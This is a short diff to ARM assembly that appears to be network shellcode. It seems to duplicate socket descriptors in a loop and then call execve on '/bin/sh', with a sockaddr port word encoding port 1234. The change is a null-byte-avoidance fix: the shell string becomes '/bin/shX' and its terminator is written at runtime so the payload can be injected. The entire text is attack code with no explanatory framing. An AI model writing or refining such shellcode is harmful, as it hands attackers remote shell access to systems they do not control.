@@ -61,6 +61,7 @@ dup_loop:
     adr    r0, sh       // r0 = "/bin/sh" 
     eor    r2, r2, r2   // r2 = NULL
     eor    r1, r1, r1   // r1 = NULL
+    strb   r2, [r0, #7] // add null terminator    
     mov    r7, #11      // r7 = execve
     svc    1
     nop                 // alignment by 4 bytes
@@ -68,7 +69,7 @@ dup_loop:
 sin_port:    
 .word  0xd2040002
 sh:    
-.ascii "/bin/sh"
+.ascii "/bin/shX"
 
 
 
